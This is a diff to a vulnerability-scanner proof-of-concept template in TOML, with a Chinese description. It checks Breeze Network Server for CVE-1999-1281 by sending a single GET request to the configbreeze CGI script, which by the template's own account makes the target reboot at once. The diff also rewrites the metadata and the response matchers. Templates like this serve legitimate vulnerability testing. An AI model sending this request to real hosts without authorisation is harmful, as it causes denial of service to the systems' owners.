@@ -1,10 +1,14 @@
 [info]
-author = "ave"
-description = "Breeze Network Server 开发版 configbreeze CGI 远程系统重启漏洞验证。向目标服务器的 configbreeze CGI 脚本发送 GET 请求，返回的 CGI 响应表明目标存在该 CGI 端点，可能导致远程系统重启。"
+author = "AVE"
+description = "验证 Breeze Network Server 开发版本中 configbreeze CGI 程序导致的远程拒绝服务漏洞。通过 HTTP GET 请求访问该 CGI 程序，可使目标系统立即重启"
 id = "POC-AVE-1999-1449"
-name = "CVE-1999-1281 Breeze Network Server Remote Reboot PoC"
+name = "Breeze Network Server configbreeze CGI DoS PoC"
 severity = "medium"
-tags = ["ave-1999-1449"]
+tags = [
+    "cve-1999-1281",
+    "dos",
+    "breeze-network-server",
+]
 vuln_id = [
     "CVE-1999-1281",
     "AVE-1999-1449",
@@ -18,33 +22,12 @@ method = "GET"
 path = "/{{BaseURL}}/cgi-bin/configbreeze"
 protocol = "http"
 
-[poc.requests.body]
-content = ""
-type = "raw"
-
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "200",
-    "Content-Type",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/configbreeze"
-protocol = "http"
-
-[poc.requests.body]
-content = ""
-type = "raw"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "200",
-    "Content-Type",
+    "500",
+    "Service Unavailable",
+    "Connection reset",
 ]
